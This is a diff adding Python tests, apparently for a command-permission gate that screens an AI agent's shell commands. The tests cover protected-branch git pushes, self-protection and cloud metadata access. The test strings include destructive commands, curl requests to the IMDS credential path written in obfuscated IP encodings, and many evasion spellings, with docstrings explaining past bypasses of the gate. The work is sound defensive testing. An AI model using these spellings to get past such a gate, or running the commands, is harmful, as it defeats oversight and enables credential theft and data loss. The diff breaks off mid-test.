+        from kiro_crew.security import is_denied
+
+        for cmd in (
+            "eval 'ls' '-la'",
+            "eval 'echo' 'hello world'",
+            "eval 'git' 'status'",
+            "eval 'git' 'push origin my-feature'",
+        ):
+            assert is_denied(cmd) is None, cmd
+
+    def test_a_wrapped_feature_branch_push_is_not_blocked(self) -> None:
+        """The over-block: ordinary work refused along with the protected case.
+
+        Admitting ``(`` as a leading separator makes the OUTER wrapper line
+        match the publish detector, because the ``(`` sits right after the
+        wrapper's quote. That line is not itself a push -- the push text lives
+        inside one quoted argument -- so no ``git`` token is there to parse, and
+        the "detected but unparseable" rule denied it. That rule is for
+        obfuscation, which a quoted payload is not, so a FEATURE-branch push
+        inside a subshell inside a wrapper was refused.
+        """
+        from kiro_crew.security import is_denied
+
+        for cmd in (
+            "bash -c '(git push origin my-feature)'",
+            'bash -c "(git push origin my-feature)"',
+            "bash -c '(cd /tmp && git push origin my-feature)'",
+            "bash -c \"(git push origin 'release/x')\"",
+            "sh -c '(git push origin fix/some-branch)'",
+        ):
+            assert is_denied(cmd) is None, cmd
+
+    def test_the_wrapped_protected_push_is_still_denied(self) -> None:
+        """The deferral must not cost the denial it exists alongside.
+
+        These need the payload descent AND the quote-aware operator cut
+        together: the ref is quoted inside a subshell inside a wrapper.
+        """
+        from kiro_crew.security import is_denied
+
+        for cmd in (
+            "bash -c '(git push origin main)'",
+            "bash -c \"(git push origin 'main')\"",
+            "sh -c \"(cd /tmp; git push origin 'main')\"",
+            "bash -c \"(git push --force origin 'mainline')\"",
+            "eval \"(git push origin 'mainline')\"",
+        ):
+            assert is_denied(cmd) is not None, cmd
+
+    def test_a_verb_named_argument_does_not_buy_a_deferral(self) -> None:
+        """The deferral must key on a payload that is itself a publish.
+
+        Asking only whether a payload EXISTS was a bypass. A remote or refspec
+        that happens to share a name with a shell verb makes the payload walk
+        report a payload, and QUOTING the program defeats the ``git`` anchor so
+        the args come back None. Together those two let a protected-branch
+        publish through: nothing downstream ever judged it, because the payload
+        the outer line deferred to was the bare word ``main``, which is not a
+        publish and answers nothing.
+        """
+        from kiro_crew.security import is_denied
+
+        for cmd in (
+            '"git" push eval main',
+            "'git' push eval main",
+            '"git" push source main',
+            '"git" push . main',
+            '"git" push origin main',
+            "git push eval main",
+            "git push source main",
+            "git push origin eval main",
+        ):
+            assert is_denied(cmd) is not None, cmd
+
+    def test_the_publish_floor_returns_a_decision_when_the_walk_raises(self) -> None:
+        """The gate must DECIDE, never raise.
+
+        The floor's payload enumeration ran unguarded, so a helper that exploded
+        escaped ``is_denied`` and the PreToolUse gate crashed instead of denying.
+        On failure it degrades to the top-level reading -- exactly what this
+        floor checked before it learned to descend -- so a broken walk costs the
+        nested coverage and nothing else.
+        """
+        import kiro_crew.security as sec
+
+        def boom(*_a: object, **_k: object) -> object:
+            raise RuntimeError("payload walk exploded")
+
+        original = sec._nested_shell_payloads
+        try:
+            sec._nested_shell_payloads = boom  # type: ignore[assignment]
+            # Decides rather than raising, and the top-level reading still holds.
+            assert sec.is_denied("git push origin main") is not None
+            assert sec.is_denied("rm -rf /") is not None
+            assert sec.is_denied("git push origin my-feature") is None
+        finally:
+            sec._nested_shell_payloads = original  # type: ignore[assignment]
+
+    def test_an_operator_in_an_executable_path_is_not_a_shell_operator(self) -> None:
+        """Punctuation inside an already-tokenized word belongs to the word.
+
+        The normalizer has tokenized and dequoted before this detector runs, so
+        replacing each token with its operator-cut form truncated a legal
+        executable path (``/opt/my(dir)/git`` -> ``/opt/my``, whose basename is
+        not ``git``). Detection was NARROWED and a protected push through such a
+        path went from denied to allowed. Both spellings are consulted now, so
+        the widen-only property actually holds.
+        """
+        from kiro_crew.security import is_denied
+
+        for cmd in (
+            '"/opt/my(dir)/git" push origin main',
+            "'/opt/my(dir)/git' push origin main",
+            '"/opt/my(dir)/git" push origin mainline',
+            '"/opt/a(b)/git" push --force origin main',
+            "/usr/bin/git push origin main",
+            '"/usr/bin/git" push origin main',
+        ):
+            assert is_denied(cmd) is not None, cmd
+
+        # The glued-operator spellings the cut exists for still resolve.
+        for cmd in ("(git push origin main)", "(git push origin 'main')"):
+            assert is_denied(cmd) is not None, cmd
+
+    def test_obfuscation_with_no_payload_still_fails_closed(self) -> None:
+        """The deferral is NOT a general escape hatch.
+
+        The outer reading defers only when a nested payload exists to defer TO.
+        Glue-evasion carries no payload, so it must still be denied on the spot.
+        """
+        from kiro_crew.security import is_denied
+
+        for cmd in (
+            "git$(echo ' ')push origin main",
+            "git`echo ' '`push origin main",
+            "git push origin ma$(echo)in",
+            "git push",
+            "git push --mirror origin",
+        ):
+            assert is_denied(cmd) is not None, cmd
+
+    def test_the_eval_join_stays_linear(self) -> None:
+        """A join is O(N), so one per verb token would be quadratic.
+
+        The nested-payload walk was deliberately made linear and is pinned that
+        way, but those shapes use shell-program tokens only, so this path is not
+        covered there. Bounding the join to once per walk keeps it linear, and
+        one is enough because it runs to the END of the token list and therefore
+        already spans every later verb's own suffix.
+
+        Growth is measured as the total characters of payload the walk produces,
+        not as wall-clock time. A join's cost is the length of the string it
+        builds, so the character total IS the join work, and it is a pure
+        function of the input: an 8x size gap reads as exactly 8x for a linear
+        walk and 64x for one that joins once per verb, with nothing to tune. The
+        wall-clock form of this assertion was widened once and still flipped on a
+        loaded host, because the small sample is a few milliseconds and one
+        preemption during the large one breaches any ratio a regression would
+        also breach. Interpreter call counts do not work either: ``str.join`` is
+        one C call whatever its length, so an unbounded join reads as linear
+        there. The exact, size-free half of the property is pinned by
+        ``test_only_one_joined_payload_is_produced_per_walk`` (one join per call)
+        and ``test_a_join_produced_frame_does_not_join_again`` (no join chain).
+        """
+        from kiro_crew.security import _nested_shell_payloads
+
+        def payload_chars(n: int) -> int:
+            tokens = ["eval", "a", "b"] * n
+            return sum(len(payload) for payload in _nested_shell_payloads(list(tokens)))
+
+        small, large = payload_chars(2000), payload_chars(16000)
+        # 16 sits between the linear reading (8x) and the quadratic one (64x).
+        assert large < small * 16, f"{small} -> {large} payload chars looks super-linear"
+
+    def test_only_one_joined_payload_is_produced_per_walk(self) -> None:
+        """The bound above is what keeps it linear, so pin the bound itself."""
+        from kiro_crew.security import _nested_shell_payloads
+
+        tokens = ["eval", "git", "push origin main", "eval", "x", "y"]
+        payloads = _nested_shell_payloads(list(tokens))
+        joined = [p for p in payloads if " " in p and p.count(" ") > 1]
+        assert len(joined) == 1, payloads
+        # The one join reaches the end, so the later verb's suffix is inside it.
+        assert joined[0].endswith("x y"), joined
+        assert "push origin main" in joined[0], joined
+
+    def test_a_join_produced_frame_does_not_join_again(self) -> None:
+        """The join is once per FRAME; the chain it can build is the real cost.
+
+        A joined payload is strictly shorter than its parent, so it becomes a frame
+        of its own -- and if that frame joins too, both walks build a chain of
+        shrinking suffixes, N frames each costing an O(N) lex and an O(N) join.
+        Measured on ``"eval " * 1280``: 65 s, growing ~5x per doubling, against
+        0.13 s before the join existed. Frame counts are pinned instead of timings
+        because they are exact: they do not grow with N at all.
+        """
+        from kiro_crew.security import _deny_segment_views, _shell_payload_walk
+
+        counts = {
+            n: (len(_shell_payload_walk("eval " * n)), len(_deny_segment_views("eval " * n)))
+            for n in (8, 16, 64, 256)
+        }
+        assert len(set(counts.values())) == 1, counts
+        assert all(walk <= 4 and views <= 5 for walk, views in counts.values()), counts
+
+    def test_the_join_still_fuses_a_split_publish_at_any_depth(self) -> None:
+        """Declining the SECOND join costs no detection.
+
+        The join fuses already-dequoted words in one step, so ``eval eval 'git'
+        'push origin main'`` is fused to ``git push origin main`` by the first join
+        and the chain only re-derived suffixes of an answer already in hand.
+        """
+        from kiro_crew.security import is_denied
+
+        for cmd in (
+            "eval 'git' 'push origin main'",
+            "eval eval 'git' 'push origin main'",
+            "eval " * 8 + "'git' 'push origin main'",
+            "eval " * 512 + "'git' 'push origin main'",
+            "bash -c \"eval eval 'git' 'push origin main'\"",
+            "$(eval 'git' 'push origin main')",
+            "cat <(eval 'git' 'push origin main')",
+            # two sibling frames, each needing its OWN join
+            "bash -c \"eval 'git' 'push origin feat'\" ; "
+            "bash -c \"eval 'git' 'push origin main'\"",
+        ):
+            assert is_denied(cmd) is not None, cmd
+
+        for cmd in (
+            "eval 'git' 'push origin my-feature'",
+            "eval eval 'git' 'push origin my-feature'",
+            "eval 'echo' 'hello world'",
+        ):
+            assert is_denied(cmd) is None, cmd
+
+    def test_source_arguments_are_not_joined(self) -> None:
+        """``source``/``.`` take a FILE; the rest are positional parameters.
+
+        Joining them would invent a command line bash never runs, so the
+        concatenation is scoped to ``eval`` alone.
+        """
+        from kiro_crew.security import _nested_shell_payloads, normalize_shell_command
+
+        for cmd in ("source setup.sh arg1 arg2", ". setup.sh arg1 arg2"):
+            payloads = _nested_shell_payloads(normalize_shell_command(cmd))
+            assert payloads == ["setup.sh"], (cmd, payloads)
+
+    def test_prefix_forms_of_a_real_push_still_denied(self) -> None:
+        """Guards against narrowing detection to fix the ``echo`` false positive.
+
+        Requiring ``git`` to sit in ``_argv_programs`` command position was tried
+        and silently broke all five of these, so the walk deliberately still
+        scans every token.
+        """
+        from kiro_crew.security import is_denied
+
+        for cmd in (
+            "/usr/bin/git push origin main",
+            "env FOO=1 git push origin main",
+            "sudo git push origin main",
+            "nohup git push origin main",
+            "command git push origin main",
+            "bash -c 'env X=1 git push origin mainline'",
+        ):
+            assert is_denied(cmd) is not None, cmd
+
+    def test_wrapped_feature_push_still_allowed(self) -> None:
+        from kiro_crew.security import is_denied
+
+        # The floor decides protected-vs-feature, so widening DETECTION must not
+        # turn ordinary work into a denial.
+        for cmd in (
+            "bash -c 'git push origin my-feature'",
+            "sh -c 'git push origin fix/thing'",
+        ):
+            assert is_denied(cmd) is None, cmd
+
+    def test_wrapped_benign_not_overblocked(self) -> None:
+        from kiro_crew.security import is_denied
+
+        for cmd in (
+            "bash -c 'echo remember to push later'",
+            "bash -c 'git fetch origin main'",
+            "bash -c 'ls -la'",
+            "git stash push -m wip",
+        ):
+            assert is_denied(cmd) is None, cmd
+
+    def test_self_protection_floor_shares_the_walk(self) -> None:
+        from kiro_crew.security import is_denied
+
+        # Same walk now feeds both floors; the self-protection side must not
+        # regress when the publish side starts consuming it.
+        for cmd in (
+            "bash -c 'kirocrew token'",
+            "bash -c 'kirocrew restart'",
+            "cat <(kirocrew token)",
+        ):
+            assert is_denied(cmd) is not None, cmd
+
+    def test_payload_sources_and_frames_agree(self) -> None:
+        from kiro_crew.security import _self_token_frames, _shell_payload_sources
+
+        # The two views are projections of ONE walk, so they must stay the same
+        # length -- a drift here is the class of bug this refactor removes.
+        cmd = "bash -c 'git push origin main'"
+        assert len(_shell_payload_sources(cmd)) == len(_self_token_frames(cmd))
+        assert cmd in _shell_payload_sources(cmd)
+        assert "git push origin main" in _shell_payload_sources(cmd)
+
+
+class TestGluedShellCommandPayloadExtraction:
+    """A payload GLUED to a ``-c`` short-option cluster is extracted.
+
+    ``sh -c'rg . /fenced/root'`` reaches the walk as ONE token
+    (``-crg . /fenced/root``) once shlex strips the quotes.
+    ``_SHELL_COMMAND_FLAG_RE`` anchors the whole token as a bare flag cluster, so
+    a token carrying the payload's own characters was rejected -- and a payload
+    the extractor does not return is a command NONE of its consumers look
+    inside, the self-protection floor included.  The companion pattern
+    ``_SHELL_COMMAND_GLUED_RE`` captures the glued remainder instead of
+    weakening the flag pattern where it is used for pure flag detection.
+    """
+
+    def test_every_glued_spelling_yields_the_spaced_payload(self) -> None:
+        """Glued single-quoted, double-quoted, and clustered spellings agree."""
+        from kiro_crew.security import _nested_shell_payloads, _shell_tokens
+
+        spaced = _nested_shell_payloads(_shell_tokens("sh -c 'rg . /fenced/root'"))
+        assert spaced == ["rg . /fenced/root"], spaced
+        for cmd in (
+            "sh -c'rg . /fenced/root'",  # glued single-quoted
+            'sh -c"rg . /fenced/root"',  # glued double-quoted
+            "sh -ec'rg . /fenced/root'",  # letters BEFORE the c in the cluster
+            "sh -xc'rg . /fenced/root'",
+        ):
+            payloads = _nested_shell_payloads(_shell_tokens(cmd))
+            assert payloads == spaced, (cmd, payloads)
+
+    def test_glued_unquoted_payload_is_extracted(self) -> None:
+        """No quotes at all: ``-cwhoami`` runs ``whoami`` in a real shell."""
+        from kiro_crew.security import _nested_shell_payloads, _shell_tokens
+
+        payloads = _nested_shell_payloads(_shell_tokens("bash -cwhoami"))
+        assert "whoami" in payloads, payloads
+
+    def test_bare_cluster_is_not_read_as_glued(self) -> None:
+        """Negative: ``-lc`` and ``-c`` carry no payload of their own.
+
+        The script is the NEXT token, exactly as before -- the glued reading must
+        not invent a second payload out of a bare flag cluster.
+        """
+        from kiro_crew.security import _nested_shell_payloads, _shell_tokens
+
+        payloads = _nested_shell_payloads(_shell_tokens("bash -lc 'git status'"))
+        assert payloads == ["git status"], payloads
+        assert _nested_shell_payloads(_shell_tokens("bash -c")) == []
+
+    def test_all_alpha_cluster_yields_both_readings(self) -> None:
+        """``-ecfoo`` is ambiguous post-tokenization, so BOTH readings surface.
+
+        It matches the bare-flag pattern (the next token is the script, the
+        reading this extractor always had) AND a real shell ends option parsing
+        at the ``c`` and runs ``foo``.  Picking one interpretation would make the
+        other a bypass; extraction over-approximates instead, which this module
+        documents as the safe direction.
+        """
+        from kiro_crew.security import _nested_shell_payloads, _shell_tokens
+
+        payloads = _nested_shell_payloads(_shell_tokens("bash -ecfoo bar"))
+        assert "foo" in payloads, payloads
+        assert "bar" in payloads, payloads
+
+    def test_a_glued_decoy_does_not_eat_a_later_spaced_payload(self) -> None:
+        """The two spellings are scanned independently, so both yield.
+
+        Folding the glued spelling into the shared stop table would let a glued
+        decoy consume the stop through which a later spaced ``-c``'s payload was
+        found, turning the fix itself into a bypass.
+        """
+        from kiro_crew.security import _nested_shell_payloads, _shell_tokens
+
+        payloads = _nested_shell_payloads(_shell_tokens("bash -cx.sh -c 'rg . /fenced/root'"))
+        assert "x.sh" in payloads, payloads
+        assert "rg . /fenced/root" in payloads, payloads
+
+    def test_a_herestring_does_not_eat_a_later_command_flag_payload(self) -> None:
+        """The herestring stop is independent of the ``-c`` stop for the same
+        reason: sharing one table let ``bash <<<'x' -c '<script>'`` yield only
+        ``x`` while a real shell runs the script."""
+        from kiro_crew.security import _nested_shell_payloads, _shell_tokens
+
+        payloads = _nested_shell_payloads(_shell_tokens("bash <<<'x' -c 'rg . /fenced/root'"))
+        assert "x" in payloads, payloads
+        assert "rg . /fenced/root" in payloads, payloads
+
+    def test_uppercase_cluster_letters_still_carry_the_payload(self) -> None:
+        """``-C`` (noclobber) clusters like any other flag, and the alt pass
+        feeds case-PRESERVING tokens -- a lowercase-only class dropped these."""
+        from kiro_crew.security import _nested_shell_payloads, _shell_tokens
+
+        for cmd in (
+            "bash -Cc'rg . /fenced/root'",
+            "bash -Cc 'rg . /fenced/root'",
+        ):
+            payloads = _nested_shell_payloads(_shell_tokens(cmd))
+            assert "rg . /fenced/root" in payloads, (cmd, payloads)
+
+    def test_case_folded_cluster_splits_are_all_examined(self) -> None:
+        """Which ``c`` took the argument is unrecoverable after the case fold.
+
+        The deny tiers lowercase input before the walk, so ``-Cc'<script>'``
+        (``-C`` noclobber + ``-c`` script, a real zsh/ksh spelling) folds to
+        ``-cc<script>`` and the first-``c`` split reads the payload as
+        ``c<script>`` -- one junk letter hid a protected push from the publish
+        floor, and the attacker can also write the folded spelling directly
+        (found by the GPT 5.6 CI lane).  Every plausible split is yielded
+        instead: the run's last ``c`` (all flags) and second-to-last (a payload
+        whose program starts with one ``c``, like ``cat``).
+        """
+        from kiro_crew.security import (
+            _nested_shell_payloads,
+            _shell_c_carrier_payloads,
+            _shell_tokens,
+            is_denied,
+        )
+
+        for cmd in (
+            "zsh -Cc'git push origin main'",
+            "bash -Cc'git push origin main'",
+            "zsh -cc'git push origin main'",  # folded spelling written directly
+            "bash -Cc'git push --force origin main'",
+        ):
+            assert is_denied(cmd) is not None, cmd
+        # The correct boundary is among the yielded candidates.
+        payloads = _nested_shell_payloads(_shell_tokens("zsh -cc'git push origin main'"))
+        assert "git push origin main" in payloads, payloads
+        # A payload whose program name itself starts with ``c``.
+        assert "cat /fenced/file" in _shell_c_carrier_payloads("-cccat /fenced/file")
+        # A ``c`` past the first non-letter belongs to the payload's own text:
+        # splitting there would shred the payload, so it is not a candidate.
+        assert _shell_c_carrier_payloads("-crg . /fenced/root") == ["rg . /fenced/root"]
+        # Split positions are bounded to the window: an alternating-``c``
+        # cluster of any length yields a bounded candidate set instead of a
+        # quadratic one (a ~3 KB such token outlived the loop watchdog), and
+        # the bound is not a padding bypass -- the true split sits within a
+        # first-word length of the region's end, and padding only adds fake
+        # splits farther out.
+        flooded = _shell_c_carrier_payloads("-" + "ac" * 1600 + "c'git push origin main'")
+        assert len(flooded) <= 70, len(flooded)
+        # Feature-branch pushes and benign scripts stay allowed.
+        assert is_denied("bash -Cc'git push origin my-feature'") is None
+        assert is_denied("bash -cc'ls -la'") is None
+
+    def test_an_uppercase_cluster_does_not_eat_the_command_flag_stop(self) -> None:
+        """The flag pattern stays lowercase-only ON PURPOSE.
+
+        Widening it to ``[A-Za-z]`` made ``-Cc`` the first flag stop, which ate
+        the stop through which a following ``--command``'s payload was found --
+        the one old-stop class neither the glued table nor the sweep reaches.
+        Uppercase clusters are covered by the sweep and the glued pattern
+        instead, so BOTH payloads surface for the CASE-PRESERVING callers (the
+        alt-traversal pass, pinned here by calling the extractor directly).
+        The deny tiers lowercase first, where ``-Cc`` folds to ``-cc`` and the
+        ``--command`` residual remains -- pre-existing there, and out of this
+        pattern's reach.
+        """
+        from kiro_crew.security import _nested_shell_payloads, _shell_tokens
+
+        payloads = _nested_shell_payloads(_shell_tokens("bash -Cc --command 'rg . /fenced/root'"))
+        assert "rg . /fenced/root" in payloads, payloads
+
+    def test_every_carrier_is_swept_not_only_the_first_stop(self) -> None:
+        """Each stop table reads ONE token per shell, so a decoy that satisfies
+        the same predicate eats the stop through which a later carrier's payload
+        was found.  The every-carrier sweep restores what the alt pass's deleted
+        local extractor yielded: a payload for EVERY ``-c`` carrier, under the
+        loose recognition (any prefix before the first lowercase ``c``).
+        """
+        from kiro_crew.security import _nested_shell_payloads, _shell_tokens
+
+        # A glued decoy before a glued carrier (both satisfy the glued predicate).
+        payloads = _nested_shell_payloads(_shell_tokens("ksh -onoclobber -c'rg . /fenced/root'"))
+        assert "rg . /fenced/root" in payloads, payloads
+        # A flag decoy before a spaced carrier (both satisfy the flag predicate).
+        payloads = _nested_shell_payloads(
+            _shell_tokens("bash -Cc benign -c 'git push origin main'")
+        )
+        assert "git push origin main" in payloads, payloads
+        # Two spaced carriers: the second must not collapse into the first.
+        payloads = _nested_shell_payloads(_shell_tokens("bash -c 'true' -c 'rg . /fenced/root'"))
+        assert "true" in payloads, payloads
+        assert "rg . /fenced/root" in payloads, payloads
+        # A glued decoy before a glued carrier of the publish floor's payload.
+        payloads = _nested_shell_payloads(_shell_tokens("bash -cx.sh -c'git push origin main'"))
+        assert "git push origin main" in payloads, payloads
+
+    def test_non_alpha_cluster_prefixes_still_carry_the_payload(self) -> None:
+        """The deleted local extractor tolerated ANY prefix before the first
+        lowercase ``c`` (``-1c``); the loose sweep preserves that recognition."""
+        from kiro_crew.security import _nested_shell_payloads, _shell_tokens
+
+        payloads = _nested_shell_payloads(_shell_tokens("bash -1c 'rg . /fenced/root'"))
+        assert "rg . /fenced/root" in payloads, payloads
+        payloads = _nested_shell_payloads(_shell_tokens("bash -1c'rg . /fenced/root'"))
+        assert "rg . /fenced/root" in payloads, payloads
+
+    def test_many_shells_sharing_one_long_glued_payload_stay_linear(self) -> None:
+        """N shell tokens all stop at ONE glued token carrying a length-N payload.
+
+        Extracting at the stop index per shell token copies the same length-N
+        substring N times -- O(N^2) time and memory for an O(N)-sized input,
+        inside the synchronous permission gate (found by the GPT 5.6 review
+        lane).  The payload is extracted once per TOKEN up front and later
+        appends reuse the cached string, so the walk stays linear.  Measured
+        across an 8x size gap with a 20x bound, the same methodology the
+        eval-join linearity test above documents.
+        """
+        import time
+
+        from kiro_crew.security import _nested_shell_payloads
+
+        def elapsed(n: int) -> float:
+            tokens = ["bash"] * n + ["-c" + "x" * n]
+            start = time.perf_counter()
+            _nested_shell_payloads(tokens)
+            return time.perf_counter() - start
+
+        def best(n: int, samples: int = 3) -> float:
+            return min(elapsed(n) for _ in range(samples))
+
+        elapsed(500)
+        small, large = best(2000), best(16000)
+        assert large < small * 20, f"{small:.4f}s -> {large:.4f}s looks super-linear"
+        # No absolute cap, matching the eval-join test above: under the backend
+        # jobs' coverage tracing wall time prices line events, not algorithmic
+        # cost; the same-run ratio is the regression guard.
+
+    def test_glued_payload_reaches_the_regex_tier_views(self) -> None:
+        """Consumer: the deny-view pass judges the glued payload's own text."""
+        from kiro_crew.security import is_denied
+
+        spaced = "bash -c 'dd \"if=/dev/zero\" of=/dev/sda'"
+        glued = "bash -c'dd \"if=/dev/zero\" of=/dev/sda'"
+        assert is_denied(spaced) is not None
+        assert is_denied(glued) is not None
+
+
+class TestImdsMixedBaseEncodings:
+    """The IMDS gate must fold every base in every octet position.
+
+    ``canonicalize_ip`` already resolved all of these; the EXTRACTION regex
+    could not capture them whole, so it handed the canonicalizer a truncated
+    substring that folded to a harmless address while the OS resolver still
+    routed the full token to 169.254.169.254 (credential-theft SSRF).
+    Ground truth for each host below: ``socket.getaddrinfo`` resolves it to the
+    IMDS address on glibc.
+    """
+
+    #: Every spelling here genuinely resolves to the IMDS address.
+    IMDS_FORMS = (
+        "025177524776",  # zero-padded/octal single integer, >10 digits
+        "169.254.0251.0376",  # decimal + octal octets mixed
+        "0251.0376.169.254",  # octal leading, decimal trailing
+        "169.254.0xa9.0376",  # hex + octal in non-leading positions
+        "0251.16689662",  # octal 2-part inet_aton short form
+        "169.254.169.0376",  # octal final octet only
+        "0000000169.254.169.254",  # arbitrary zero padding
+    )
+
+    def test_mixed_base_imds_encodings_blocked(self) -> None:
+        from kiro_crew.security import _check_imds_access, canonicalize_ip
+
+        for host in self.IMDS_FORMS:
+            assert canonicalize_ip(host) == "169.254.169.254", host
+            cmd = f"curl http://{host}/latest/meta-data/iam/security-credentials/"
+            assert _check_imds_access(cmd) is not None, host
+            assert is_sensitive_bash_command(cmd) is not None, host
+
+    def test_padded_hex_imds_encodings_blocked(self) -> None:
+        """A length cap on the extraction regex is itself the bypass.
+
+        Capping the hex run truncated a zero-padded spelling into a DIFFERENT,
+        harmless address -- ``0x0a9fea9fe`` folded to 10.159.234.159 -- so the
+        gate failed open on a form glibc ``inet_aton`` accepts and routes to
+        IMDS. The components are plain character classes with no nested
+        quantifier, so an unbounded run is linear and the cap bought nothing.
+        """
+        from kiro_crew.security import _check_imds_access, canonicalize_ip
+
+        for host in (
+            "0x0a9fea9fe",  # leading-zero hex, 9 digits
+            "0x00000000a9fea9fe",  # heavily padded hex
+            "169.254.0x00000000a9.0376",  # padded hex component mid-token
+        ):
+            assert canonicalize_ip(host) == "169.254.169.254", host
+            cmd = f"curl http://{host}/latest/meta-data/iam/security-credentials/"
+            assert _check_imds_access(cmd) is not None, host
+            assert is_sensitive_bash_command(cmd) is not None, host
+
+    def test_unbounded_extraction_stays_linear(self) -> None:
+        import time
+
+        from kiro_crew.security import _check_imds_access
+
+        # Guards the reason the caps are gone: unbounded runs over plain
+        # character classes must not backtrack. Generous bound -- the observed
+        # cost is single-digit milliseconds.
+        for payload in ("9" * 40000, "0" * 40000, "0x" + "a" * 40000):
+            start = time.monotonic()
+            _check_imds_access(f"curl http://{payload}/x")
+            assert time.monotonic() - start < 5.0, payload
+
+    def test_mixed_base_non_imds_not_overblocked(self) -> None:
+        from kiro_crew.security import _check_imds_access, canonicalize_ip
+
+        # 169.0000254.169.254 is a legal mixed encoding that resolves to
+        # 169.172.169.254 (0254 octal == 172), NOT to IMDS -- widening the
+        # extraction must not turn "looks like an IP" into "is IMDS".
+        assert canonicalize_ip("169.0000254.169.254") == "169.172.169.254"
+        assert _check_imds_access("curl http://169.0000254.169.254/x") is None
+        # Out-of-range single integer stays unparsed and unflagged.
+        assert _check_imds_access("curl http://02511777524776/x") is None
+        # A long digit run that is not an address at all (timestamp/id).
+        assert _check_imds_access("echo 17251234567890123") is None
+
+
+class TestGitPublishSubshellGluing:
+    """``(`` and ``)`` are shell OPERATORS, so they cannot hide a git push.
+
+    Every git-publish rule is stripped from the regex tier, which makes
+    ``_is_git_publish`` the SOLE enforcement for pushes. A paren glued to the
+    program (``(git push``) defeated the detector, and a paren glued to the ref
+    (``main)``) defeated the protected-name compare -- the latter also emitted a
+    SEL ``push_allowed`` event labelled ``feature_branch_push`` for a
+    protected-branch force-push.
+    """
+
+    GLUED_PROTECTED_PUSHES = (
+        "(git push origin main)",
+        "((git push origin main))",
+        "(cd /tmp; git push origin main)",
+        "(cd /tmp && git push origin mainline)",
+        "(cd /tmp; git push --force origin mainline)",
+        "(true; git push origin head:main)",
+        "(git push --mirror origin)",
+    )
+
+    def test_glued_subshell_protected_push_denied(self) -> None:
+        from kiro_crew.security import is_denied
+
+        for cmd in self.GLUED_PROTECTED_PUSHES:
+            assert is_denied(cmd) is not None, cmd
+
+    def test_glued_subshell_push_reaches_protected_branch_check(self) -> None:
+        from kiro_crew.security import _is_push_to_protected_branch
+
+        # Not merely denied: the branch check must SEE the protected target, or
+        # the allow-audit records a protected push as a feature-branch push.
+        for cmd in (
+            "(cd /tmp; git push origin main)",
+            "(cd /tmp; git push --force origin mainline)",
+            "(git push origin mainline)",
+        ):
+            assert _is_push_to_protected_branch(cmd.lower()) is True, cmd
+
+    GLUED_OPERATOR_PUSHES = (
+        "(git push origin main)&",  # trailing background operator
+        "(git push origin main);",
+        "(git push origin main)|cat",
+        "(git push origin mainline)>log",  # operator MID-token, strip cannot reach it
+        "(cd /tmp; git push origin main)&",
+        "{ git push origin main; }",
+        "(git push --force origin mainline)&",
+    )
+
+    def test_glued_operator_on_the_ref_is_not_part_of_the_name(self) -> None:
+        """bash reads ``main)&`` as the ref ``main`` plus two operators.
+
+        Stripping only parens left ``main)&``, which never equalled ``main``, so a
+        protected push was allowed AND audited as a feature-branch push. A
+        redirection glued mid-token (``mainline)>log``) is why this cuts at the
+        first operator instead of stripping the ends.
+        """
+        from kiro_crew.security import _is_push_to_protected_branch, is_denied
+
+        for cmd in self.GLUED_OPERATOR_PUSHES:
+            assert _is_push_to_protected_branch(cmd.lower()) is True, cmd
+            assert is_denied(cmd) is not None, cmd
+
+    def test_cut_at_operator_preserves_a_quoted_ref(self) -> None:
+        from kiro_crew.security import _cut_at_operator
+
+        # Unquoted: operators are structure, so cut.
+        assert _cut_at_operator("(git") == "git"
+        assert _cut_at_operator("main)&") == "main"
+        assert _cut_at_operator("mainline)>log") == "mainline"
+        assert _cut_at_operator("my-feature") == "my-feature"
+        # Quoted: operators are literal text belonging to the ref name.
+        assert _cut_at_operator("'(main)'") == "'(main)'"
+        assert _cut_at_operator('"(main)"') == '"(main)"'
+
+    def test_quoted_paren_ref_is_not_a_protected_branch(self) -> None:
+        from kiro_crew.security import _is_push_to_protected_branch
+
+        # Grouping parens are stripped BEFORE the quotes come off, so a paren the
+        # user QUOTED as part of the ref name survives: a branch literally named
+        # ``(main)`` is not ``main`` and must stay pushable.
+        for cmd in ("git push origin '(main)'", 'git push origin "(main)"'):
+            assert _is_push_to_protected_branch(cmd.lower()) is False, cmd
+
+    QUOTED_REF_GLUED_OPERATOR_PUSHES = (
+        "(git push origin 'main')",
+        '(git push origin "main")',
+        "(git push origin 'mainline')",
+        '(git push origin "mainline")',
+        "(cd /tmp; git push origin 'main')",
+        "(git push --force origin 'mainline')",
+        "(git push origin 'main')&",
+        "{ git push origin 'main'; }",
+    )
+
+    def test_quoting_the_ref_does_not_hide_the_glued_operator(self) -> None:
+        """A quoted ref can still carry an operator OUTSIDE its quotes.
+
+        Bailing on the mere PRESENCE of a quote reopened the very class this
+        cut exists to close: ``(git push origin 'main')`` hands the ref token
+        ``'main')``, whose trailing ``)`` is unquoted. Left in place, the ref
+        resolved to ``main)``, never equalled ``main``, and the protected push
+        was allowed AND audited as ``feature_branch_push``. One quote character
+        was the whole bypass.
+        """
+        from kiro_crew.security import _is_push_to_protected_branch, is_denied
+
+        for cmd in self.QUOTED_REF_GLUED_OPERATOR_PUSHES:
+            assert _is_push_to_protected_branch(cmd.lower()) is True, cmd
+            assert is_denied(cmd) is not None, cmd
+
+    def test_cut_at_operator_cuts_outside_quotes_only(self) -> None:
+        from kiro_crew.security import _cut_at_operator
+
+        # Operator OUTSIDE the quotes is structure -> cut.
+        assert _cut_at_operator("'main')") == "'main'"
+        assert _cut_at_operator('"main")') == '"main"'
+        assert _cut_at_operator("'main')&") == "'main'"
+        # Operator INSIDE the quotes is part of the ref name -> keep.
+        assert _cut_at_operator("'(main)'") == "'(main)'"
+        assert _cut_at_operator("'a;b'") == "'a;b'"
+        assert _cut_at_operator("'weird&name'") == "'weird&name'"
+        # An unbalanced quote reads the remainder as quoted, so nothing is cut.
+        # Safe: bash never runs a command with an unterminated quote.
+        assert _cut_at_operator("'main)") == "'main)"
+
+    def test_a_quoted_program_still_anchors_the_push(self) -> None:
+        """A quoted ``"git"`` is still the git program to bash.
+
+        Matching the raw token missed it and anchored on a LATER unquoted
+        ``git push``, returning only that push's arguments. Appending a benign
+        second push therefore hid the first one's protected ref completely and
+        turned a fail-closed segment into an allow.
+        """
+        from kiro_crew.security import _git_push_args, is_denied
+
+        assert _git_push_args('"git" push eval main git push origin my-feature') == [
+            "eval",
+            "main",
+            "git",
+            "push",
+            "origin",
+            "my-feature",
+        ]
+        for cmd in (
+            '"git" push eval main git push origin my-feature',
+            "'git' push eval main git push origin my-feature",
+            '"git" push origin main git push origin my-feature',
